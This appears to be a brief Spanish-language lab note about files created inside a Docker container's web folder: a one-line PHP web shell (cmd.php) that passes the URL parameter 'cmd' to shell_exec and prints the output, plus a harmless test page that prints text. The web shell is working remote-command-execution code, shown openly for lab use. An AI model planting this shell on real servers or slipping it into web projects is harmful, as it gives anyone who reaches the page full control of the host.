...
Comandos y archivos que se utilizaron:

`nano cmd.php` (Dentro del contenedor en la carpeta /var/www/html)

<?php echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>"; ?>

**este comando nos permite guiarnos por consola atraves de la url**

<?php echo "Hola esto es una prueba"; ?>

este es un archivo .php que imprime texto